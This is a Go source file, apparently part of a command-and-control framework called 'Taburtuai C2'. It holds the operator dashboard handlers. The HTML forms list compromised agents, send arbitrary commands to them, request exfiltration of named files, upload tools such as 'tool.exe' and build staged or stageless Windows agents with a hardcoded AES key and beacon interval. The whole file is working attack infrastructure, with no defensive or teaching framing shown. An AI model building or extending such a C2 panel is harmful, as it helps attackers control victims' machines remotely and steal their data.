package handlers

import (
	"html/template"
	"net/http"
)

// Di file handlers.go, kita punya:
// var agents = make(map[string]string)
// Kita akan memanfaatkannya untuk menampilkan daftar agent

// 1. Template utama (dashTmpl) dengan styling & navbar
var dashTmpl = template.Must(template.New("dashboard").Parse(`
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Taburtuai C2 Dashboard</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        h1 { text-align: center; }
        .nav { text-align: center; margin-bottom: 20px; }
        .nav a { margin: 0 15px; text-decoration: none; color: #333; }
        table { border-collapse: collapse; margin: 0 auto; width: 80%; }
        th, td { border: 1px solid #ccc; padding: 10px; text-align: left; }
        th { background-color: #f2f2f2; }
        .section { margin: 40px 0; width: 80%; margin-left: auto; margin-right: auto; }
        .btn { padding: 6px 12px; background: #007BFF; color: #fff; text-decoration: none; border-radius: 3px; }
        .btn:hover { background: #0056b3; }
    </style>
</head>
<body>
    <h1>Taburtuai C2 Dashboard</h1>
    <div class="nav">
        <a href="/dashboard">Dashboard</a>
        <a href="/commandUI">Send Command</a>
        <a href="/exfilUI">Exfil File</a>
        <a href="/uploadUI">Upload File</a>
        <a href="/buildUI">Build Agent</a>
    </div>

    <div class="section">
        <h2>Connected Agents</h2>
        {{ if .Agents }}
        <table>
            <tr>
                <th>Agent ID</th>
                <th>Hostname</th>
                <th>Actions</th>
            </tr>
            {{ range $id, $host := .Agents }}
            <tr>
                <td>{{ $id }}</td>
                <td>{{ $host }}</td>
                <td>
                    <a class="btn" href="/commandUI?agent={{ $id }}">Send Command</a>
                    <a class="btn" href="/exfilUI?agent={{ $id }}">Exfil File</a>
                </td>
            </tr>
            {{ end }}
        </table>
        {{ else }}
        <p>No Agents Connected</p>
        {{ end }}
    </div>

    <div class="section">
        <h2>Build Agent (Stageless / Staged)</h2>
        <form method="POST" action="/buildAgent">
            <label>Build Type:</label>
            <select name="buildType">
                <option value="stageless">Stageless</option>
                <option value="staged">Staged</option>
            </select><br><br>

            <label>OS:</label>
            <input type="text" name="os" value="windows"><br><br>

            <label>Architecture:</label>
            <input type="text" name="arch" value="amd64"><br><br>

            <label>Server URL:</label>
            <input type="text" name="serverURL" value="http://127.0.0.1:8080"><br><br>

            <label>AES Key:</label>
            <input type="text" name="aesKey" value="SpookyOrcaC2AES1"><br><br>

            <label>Beacon Interval:</label>
            <input type="text" name="interval" value="5"><br><br>

            <input type="submit" class="btn" value="Build Agent">
        </form>
    </div>
</body>
</html>
`))

// Handler utama dashboard
func DashboardHandler(w http.ResponseWriter, r *http.Request) {
	data := struct {
		Agents map[string]string
	}{
		Agents: agents,
	}
	dashTmpl.Execute(w, data)
}

// 2. Template untuk form command
var cmdTmpl = template.Must(template.New("cmd").Parse(`
<!DOCTYPE html>
<html>
<head><title>Send Command</title></head>
<body>
<h1>Send Command to Agent {{.AgentID}}</h1>
<form method="GET" action="/command">
  <input type="hidden" name="id" value="{{.AgentID}}">
  Command: <input type="text" name="cmd">
  <input type="submit" value="Send">
</form>
</body>
</html>
`))

func CommandUIHandler(w http.ResponseWriter, r *http.Request) {
	agentID := r.URL.Query().Get("agent")
	if agentID == "" {
		http.Error(w, "No agent selected", http.StatusBadRequest)
		return
	}
	data := struct {
		AgentID string
	}{
		AgentID: agentID,
	}
	cmdTmpl.Execute(w, data)
}

// 3. Template for exfil
var exfilTmpl = template.Must(template.New("exfil").Parse(`
<!DOCTYPE html>
<html>
<head><title>Exfil File</title></head>
<body>
<h1>Request Exfil from Agent {{.AgentID}}</h1>
<form method="GET" action="/exfil">
  <input type="hidden" name="id" value="{{.AgentID}}">
  Filename: <input type="text" name="filename">
  <input type="submit" value="Exfil">
</form>
</body>
</html>
`))

func ExfilUIHandler(w http.ResponseWriter, r *http.Request) {
	agentID := r.URL.Query().Get("agent")
	if agentID == "" {
		http.Error(w, "No agent selected", http.StatusBadRequest)
		return
	}
	data := struct {
		AgentID string
	}{
		AgentID: agentID,
	}
	exfilTmpl.Execute(w, data)
}

// 4. Template for file upload
var uploadTmpl = template.Must(template.New("upload").Parse(`
<!DOCTYPE html>
<html>
<head><title>Upload File to Server</title></head>
<body>
<h1>Upload File to Server (per Agent)</h1>
<form method="POST" action="/upload" enctype="multipart/form-data">
  Agent ID: <input type="text" name="id" placeholder="Enter agent ID"><br>
  Filename (optional): <input type="text" name="filename" value="tool.exe"><br>
  <input type="file" name="file"><br><br>
  <input type="submit" value="Upload">
</form>
</body>
</html>
`))

func UploadUIHandler(w http.ResponseWriter, r *http.Request) {
	agentID := r.URL.Query().Get("agent")
	data := struct {
		AgentID string
	}{
		AgentID: agentID,
	}
	uploadTmpl.Execute(w, data)
}

// 5. Template for build UI (opsional, bisa digabung di dashTmpl juga)
var buildTmpl = template.Must(template.New("build").Parse(`
<!DOCTYPE html>
<html>
<head><title>Build Agent</title></head>
<body>
<h1>Build Agent</h1>
<form method="POST" action="/buildAgent">
  Build Type:
  <select name="buildType">
    <option value="stageless">Stageless</option>
    <option value="staged">Staged</option>
  </select><br>

  OS: <input type="text" name="os" value="windows"><br>
  Arch: <input type="text" name="arch" value="amd64"><br>
  Server URL: <input type="text" name="serverURL" value="http://127.0.0.1:8080"><br>
  AES Key: <input type="text" name="aesKey" value="SpookyOrcaC2AES1"><br>
  Beacon Interval: <input type="text" name="interval" value="5"><br>
  <input type="submit" value="Build">
</form>
</body>
</html>
`))

func BuildUIHandler(w http.ResponseWriter, r *http.Request) {
	buildTmpl.Execute(w, nil)
}
